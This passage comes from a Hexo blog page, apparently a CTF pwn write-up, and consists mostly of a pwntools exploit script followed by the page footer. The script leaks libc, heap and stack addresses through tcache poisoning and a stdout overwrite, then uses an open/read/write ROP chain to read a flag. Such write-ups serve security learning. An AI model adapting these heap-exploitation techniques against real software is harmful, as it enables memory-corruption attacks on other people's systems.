class="number">0x20</span>)</span><br><span class="line">Load(<span class="number">0</span>)</span><br><span class="line">Shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pwn! The &quot;</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = main_arena - <span class="number">2014305</span></span><br><span class="line">info(<span class="string">&quot;libc.address &lt;================== 0x%x&quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">Buy(<span class="number">0x80</span>)</span><br><span class="line">Load(<span class="number">0</span>)</span><br><span class="line">Shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pwn! The &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x361</span></span><br><span class="line">info(<span class="string">&quot;heap.address &lt;================== 0x%x&quot;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    Buy(<span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Load(<span class="number">2</span>+i)</span><br><span class="line"></span><br><span class="line">Shoot(<span class="number">7</span>)</span><br><span class="line">Load(<span class="number">0</span>)</span><br><span class="line">Shoot(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Buy(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">Buy(<span class="number">0x38</span>,p64(libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]))  <span class="comment">#7</span></span><br><span class="line">Buy(<span class="number">0x38</span>)   <span class="comment">#8</span></span><br><span class="line">Buy(<span class="number">0x38</span>)   <span class="comment">#9</span></span><br><span class="line">Buy(<span class="number">0x38</span>,p64(<span class="number">0xbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.sym[<span class="string">&quot;environ&quot;</span>])+p64(libc.sym[<span class="string">&quot;environ&quot;</span>]+<span class="number">8</span>)+p64(libc.sym[<span class="string">&quot;environ&quot;</span>]+<span class="number">8</span>))<span class="comment">#10泄露environ地址，间接获得栈地址。</span></span><br><span class="line">p.recv()</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))+<span class="number">3848</span></span><br><span class="line">info(<span class="string">&quot;stack_base &lt;================== 0x%x&quot;</span>,stack)</span><br><span class="line">pop_rsp = <span class="number">0x32b5a</span> + libc.address</span><br><span class="line">flag = heap_base + <span class="number">0x950</span></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rop.<span class="built_in">open</span>(flag,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">rop.read(<span class="number">3</span>,flag+<span class="number">8</span>,<span class="number">0x28</span>)</span><br><span class="line">rop.write(<span class="number">1</span>,flag+<span class="number">8</span>,<span class="number">0x28</span>)</span><br><span class="line">craft = [payload,rop.chain()]</span><br><span class="line">payload = <span class="string">&quot;&quot;</span>.join(craft)</span><br><span class="line">Buy(<span class="number">0x200</span>,payload)<span class="comment">#11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    Load(i)</span><br><span class="line">Shoot(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    Buy(<span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    Load(i)</span><br><span class="line">Shoot(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Load(<span class="number">2</span>+i)</span><br><span class="line">Shoot(<span class="number">7</span>)</span><br><span class="line">Load(<span class="number">0</span>)</span><br><span class="line">Shoot(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Buy(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">Buy(<span class="number">0x18</span>,p64(stack-<span class="number">4168</span>))</span><br><span class="line">Buy(<span class="number">0x18</span>)</span><br><span class="line">Buy(<span class="number">0x18</span>)</span><br><span class="line">pause()</span><br><span class="line">Buy(<span class="number">0x18</span>,p64(pop_rsp) + p64(flag+<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </div>
+    <!--文末结束语-->
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;"> --- 本文结束 <i class="fas fa-heart"></i> The End --- </div>
+    
+    <!--页脚广告-->
+    
+    <v-divider></v-divider>
+    
+    <div class="post-nav">             
+        
+            <div class="post-nav-button float-left">
+                <v-icon>chevron_left</v-icon>
+                <a class="font-weight-bold text-left" href="/2020/11/03/Game/%E6%B9%96%E6%B9%98%E6%9D%AF/">
+                    2020 湖湘杯
+                </a>
+            </div>
+              
+          
+            <div class="post-nav-button float-right">
+                <a class="font-weight-bold text-right" href="/2020/10/11/Game/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">      
+                    2020 西湖论剑
+                </a>
+                <v-icon>chevron_right</v-icon>
+            </div>
+        
+    </div>
+</v-card>
+
+
+
+        
+                            <div id="mobile-footer" class="d-block d-md-none">
+                                <v-divider></v-divider>
+                                <div id="mobile-footer-content">
+                                    <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a> &nbsp; Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+                                    <span> &copy; 2020 - 2021 Clindy</span>
+                                </div>
+                            </div>                   
+                        </v-col>                                            
+                    </v-row>
+                </v-container>
+            </v-content>
+        </v-app>
+    </div>
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+<script src="https://cdn.jsdelivr.net/npm/vuetify@2.2.30"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/js-base64@3.5.2/base64.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({
+        startOnLoad: true,
+        theme: "default"
+    });</script>
+
+
+
+
+
+</body>
+</html>
